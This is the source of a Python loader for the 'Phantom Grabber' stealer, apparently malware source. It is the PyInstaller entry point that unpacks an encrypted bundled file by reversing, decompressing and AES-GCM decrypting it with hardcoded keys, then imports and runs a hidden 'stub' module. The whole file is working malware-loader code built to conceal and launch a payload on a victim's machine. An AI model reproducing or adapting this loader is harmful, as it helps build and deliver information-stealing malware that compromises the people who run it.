# Phantom Grabber — Loader (PyInstaller Entry Point)
# Decrypts AES-GCM encrypted payload, decompresses, and loads the stub module.
# key/iv placeholders are replaced at build time by process.py.

import os
import sys
import base64
import zlib
from pyaes import AESModeOfOperationGCM
from zipimport import zipimporter

zipfile = os.path.join(sys._MEIPASS, 'blank.aes')
module = 'stub-o'

key = base64.b64decode('MIE9Y+0kmJPqOaAsahAoieqMqbwCJQY+8Rmvtcu1gBQ=')
iv = base64.b64decode('FCb7x+fE7ORN4Lc7')


def decrypt(key: bytes, iv: bytes, ct: bytes) -> bytes:
    """Decrypt AES-GCM ciphertext with the given key and IV."""
    return AESModeOfOperationGCM(key, iv).decrypt(ct)


if os.path.isfile(zipfile):
    with open(zipfile, 'rb') as f:
        ct = f.read()

    # Reverse and decompress to recover the AES ciphertext
    ct = zlib.decompress(ct[::-1])

    # Decrypt to recover the zip containing the compiled stub
    dec = decrypt(key, iv, ct)

    # Overwrite the .aes file with the decrypted zip (in-place)
    with open(zipfile, 'wb') as f:
        f.write(dec)

    # Import and execute the stub module from the decrypted zip
    zipimporter(zipfile).load_module(module)
